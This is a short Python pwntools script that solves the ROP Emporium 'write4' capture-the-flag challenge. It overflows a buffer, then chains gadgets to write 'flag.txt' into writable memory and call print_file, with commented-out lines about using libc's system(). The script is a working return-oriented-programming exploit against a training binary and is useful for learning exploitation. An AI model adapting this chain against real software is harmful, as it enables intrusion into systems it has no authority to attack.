# ROPE{a_placeholder_32byte_flag!}
# https://ropemporium.com/challenge/write4.html

from pwn import *

pop_1 = p64(0x0000000000400690)
emptyt_data = p64(0x00601028)
flag_txt = b"flag.txt"
mov_r14_r15 = p64(0x0000000000400628)
rdi_pop = p64(0x0000000000400693)
buff = b"A" * 40
# libc_base = 0x7ffff7bb0000
elf = ELF("write4")
# libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.33.so")
# libc.address = libc_base
p = process(elf.path)
print_f = p64(elf.symbols.print_file)
print(print_f)

# payload
payload = buff + pop_1 + emptyt_data + flag_txt + \
    mov_r14_r15 + rdi_pop + emptyt_data + print_f
print(payload)

# raw_input("debug")
# send payload
p.sendline(payload)


# libc system
# sys = libc.symbols['system']
# system = libc_base + sys
# print("system --")
# print(hex(sys))


# empty space


response = p.recv()

print(response.decode())

p.interactive()
response = p.recv()

print(response.decode())
response = p.recv()

print(response.decode())
